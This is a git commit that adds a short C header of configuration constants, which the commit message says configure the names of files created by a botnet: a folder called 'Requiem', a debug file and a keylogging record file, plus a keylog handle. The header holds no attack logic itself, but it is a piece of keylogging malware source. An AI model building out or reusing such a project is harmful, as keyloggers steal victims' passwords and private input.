9e7b3c2b753fa181ea37d23f932049f4335300de
Kyle Heitman <kyle.heitman@uconn.edu>
2015-01-21 16:34:21 -0500

    Configuration file
    File used to configure the names of files created by botnet

---
+++ configs.h
@@ -0,0 +1,10 @@
+#ifndef CONFIGS_H
+#define CONFIGS_H
+
+char _folderName[70] = "Requiem"; //Name of folder to create
+char _fileName[70] = "debug.txt";		  //Name of debug file
+char _keylogFile[70] = "keylog.txt";      //Name of keylogging record file
+HANDLE keylogHandle;
+char keylogDir[MAX_PATH];
+
+#endif
